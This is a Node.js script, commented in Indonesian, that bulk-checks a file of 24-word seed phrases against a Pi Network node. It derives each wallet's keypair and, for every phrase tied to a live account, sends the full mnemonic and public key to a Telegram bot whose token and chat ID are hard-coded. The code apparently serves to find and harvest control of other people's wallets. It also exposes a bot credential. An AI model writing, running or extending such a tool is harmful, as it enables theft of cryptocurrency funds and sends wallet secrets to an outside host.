// =================================================================
// Pengecekan Akun Pi Network dengan Filter  Anti Duplikat
// =================================================================

const fs = require('fs');
const axios = require('axios');
const bip39 = require('bip39');
const edHd = require('ed25519-hd-key');
const StellarSdk = require('stellar-sdk');

// Ganti dengan info Telegram kamu
const TELEGRAM_BOT_TOKEN = '7545188050:AAHNB4_zrnLKo5t4MIL2m-AaYMVnlLc_YAM';
const TELEGRAM_CHAT_ID = '7890743177';

// Gunakan server Pi Network milikmu
const server = new StellarSdk.Server('http://4.194.35.14:31401', { allowHttp: true });

// Fungsi jeda (ms = milidetik)
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Kirim pesan ke Telegram
async function kirimTelegram(pesan) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: pesan,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error('❌ Gagal kirim ke Telegram:', error.message);
    if (error.response && error.response.status === 429) {
      console.log('Terkena rate limit Telegram, menunggu 3 detik...');
      await delay(3000);
    }
  }
}

// Konversi mnemonic ke keypair Pi Network
function mnemonicToStellarKeypair(mnemonic) {
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const { key } = edHd.derivePath("m/44'/314159'/0'", seed);
  return StellarSdk.Keypair.fromRawEd25519Seed(key);
}

// Ambil daftar mnemonic dari file
const mnemonics = fs.readFileSync('pharses.txt', 'utf8')
  .split('\n')
  .map(line => line.trim())
  .filter(line => line && line.split(' ').length === 24);

// Buat file hasil jika belum ada
if (!fs.existsSync('valid.txt')) fs.writeFileSync('valid.txt', '');
if (!fs.existsSync('invalid.txt')) fs.writeFileSync('invalid.txt', '');

// Muat isi valid & invalid untuk filter duplikat
const validList = new Set(fs.readFileSync('valid.txt', 'utf8').split('\n').map(x => x.trim()).filter(Boolean));
const invalidList = new Set(fs.readFileSync('invalid.txt', 'utf8').split('\n').map(x => x.trim()).filter(Boolean));

// Gabungkan semua mnemonic yang sudah dicek
const sudahDicek = new Set([...validList, ...invalidList]);

// Jalankan pengecekan
async function cekSemua() {
  console.log(`Memulai pengecekan untuk ${mnemonics.length} mnemonic...`);

  for (const [index, mnemonic] of mnemonics.entries()) {
    if (sudahDicek.has(mnemonic)) {
      console.log(`[${index + 1}/${mnemonics.length}] ⚙️ Dilewati (sudah dicek)`);
      continue;
    }

    try {
      const keypair = mnemonicToStellarKeypair(mnemonic);
      const pubkey = keypair.publicKey();

      // Coba ambil data akun dari jaringan Pi
      await server.loadAccount(pubkey);

      console.log(`[${index + 1}/${mnemonics.length}] ✅ Terdaftar: ${pubkey}`);
      fs.appendFileSync('valid.txt', `${mnemonic}\n`);

      const pesan = `✅ *Mnemonic Valid & Terdaftar*\n\n\`${mnemonic}\`\n\n*Public Key:*\n\`${pubkey}\``;
      await kirimTelegram(pesan);

    } catch (err) {
      const keypair = mnemonicToStellarKeypair(mnemonic);
      const pubkey = keypair.publicKey();

      if (err.response && err.response.status === 404) {
        console.log(`[${index + 1}/${mnemonics.length}] ❌ Tidak terdaftar: ${pubkey}`);
        fs.appendFileSync('invalid.txt', `${mnemonic}\n`);
      } else {
        console.error(`[${index + 1}/${mnemonics.length}] ⚠️ Error saat cek mnemonic: ${mnemonic}`);
        console.error(err.message || err);
      }
    }

    // Tambah jeda 2 detik antar pengecekan untuk hindari spam
    await delay(2000);
  }

  console.log('✅ Selesai. Semua mnemonic telah dicek tanpa duplikat.');
}

// Jalankan
cekSemua();
